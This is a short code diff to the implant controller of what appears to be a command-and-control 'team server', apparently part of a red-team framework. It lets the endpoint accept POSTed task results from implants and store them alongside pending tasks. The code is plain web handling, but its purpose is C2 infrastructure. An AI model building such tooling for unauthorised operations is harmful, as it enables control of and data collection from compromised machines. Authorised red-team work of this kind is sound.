@@ -46,7 +46,7 @@ namespace TeamServer.Infrastructure.Controllers.ImplantControllers
             }
         }
 
-        [HttpGet]
+        [HttpGet, HttpPost]
         public async Task<IActionResult> HandleImplant()
         {
             try
@@ -73,6 +73,19 @@ namespace TeamServer.Infrastructure.Controllers.ImplantControllers
                     await _agentCRUD.AddAgentAsync(agent);
                 }
                 agent.CheckIn();
+
+                if (HttpContext.Request.Method == "POST")
+                {
+                    string json;
+
+                    using ( var sr = new StreamReader(HttpContext.Request.Body))
+                    {
+                        json = await sr.ReadToEndAsync();
+                    }
+
+                    var result = JsonConvert.DeserializeObject<IEnumerable<AgentTaskResult>>(json);
+                    await _agentCore.AddTaskResult(result);
+                }
 
                 var tasks = await _agentCore.GetPendingTask();
                 return Ok(tasks ?? Array.Empty<AgentTask>());
